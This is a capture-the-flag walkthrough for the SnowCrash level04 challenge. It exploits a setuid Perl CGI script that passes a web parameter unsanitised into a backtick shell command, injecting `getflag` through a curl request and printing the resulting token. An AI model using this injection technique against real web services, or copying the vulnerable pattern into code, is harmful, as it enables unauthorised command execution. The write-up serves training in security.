 # 1st Step
List the file with `ls -l` will show us :  
`-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl`  
***Notes** : Again, the owner of the file is `flag04` so the user `level04` can execute it as `flag04`*  
  
Let's execute it to see what's appening  
```
level04@SnowCrash:~$ ./level04.pl
Content-type: text/html


level04@SnowCrash:~$
```  
Nothing happened, we should take a look at the code inside  
```
level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```  
This program is executed from a web server hosted on local machine and reachable via the port 4747  
As we can see in the code above, it will print with `echo` the output of the command. In others terms it will print the value of the variable 'x' passed as parameter !  
-> Send a request to the script with [curl](https://curl.haxx.se/docs/manual.html) and supply it the parameter x=`getflag`  
```
level04@SnowCrash:~$ curl 'localhost:4747/level04.pl?x=`getflag`'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
level04@SnowCrash:~$ su level05
Password:
level05@SnowCrash:~$
```  
level04 passed !  
  
***Notes** : We can also tape on a navigator "http://10.11.200.76:4747/?x=\`getflag\`"*